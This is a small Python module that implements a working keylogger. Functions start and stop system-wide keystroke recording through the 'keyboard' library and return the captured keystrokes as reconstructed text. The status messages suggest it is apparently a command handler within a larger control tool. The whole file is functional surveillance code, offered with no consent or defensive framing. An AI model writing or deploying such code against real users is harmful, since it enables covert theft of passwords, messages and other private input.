import keyboard

_SPECIAL = {'space': ' ', 'enter': '\n', 'tab': '\t', 'backspace': '[BS]'}
_recording = False

def start_keylogger() -> str:
    global _recording
    if _recording:
        return 'Keylogger already running'
    keyboard.start_recording()
    _recording = True
    return 'Keylogger started'

def stop_keylogger() -> str:
    global _recording
    if not _recording:
        return 'Keylogger not running'
    _recording = False
    events = keyboard.stop_recording()
    chars = (_SPECIAL.get(e.name) or (e.name if len(e.name) == 1 else '')
             for e in events if e.event_type == keyboard.KEY_DOWN)
    return ''.join(chars)
